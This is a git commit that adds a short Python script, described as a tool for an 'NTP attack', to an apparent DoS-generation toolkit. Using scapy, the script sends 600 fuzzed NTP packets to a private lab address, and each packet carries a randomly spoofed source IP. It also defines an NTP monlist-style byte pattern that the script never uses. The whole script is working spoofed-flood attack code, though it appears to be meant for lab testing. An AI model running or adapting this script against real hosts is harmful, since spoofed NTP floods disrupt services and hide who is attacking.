9b37d20fe4b928a675c97679c8e65a4a07e564f1
Ondřej Gajdušek <ogajduse@redhat.com>
2017-12-11 20:32:17 +0100

    python scripts as tools for NTP attack

---
+++ dosgen_tools/fake_ntp_hosts.py
@@ -0,0 +1,9 @@
+from scapy.all import *
+from faker import Faker
+
+faker = Faker()
+
+for i in range(600):
+    ip_addr = faker.ipv4()
+    ntp_data_pattern = "\x17\x00\x03\x2a" + "\x00" * 4
+    send(IP(dst="192.168.124.14", src=ip_addr)/fuzz(UDP()/NTP(version=4)), iface="enp7s0")
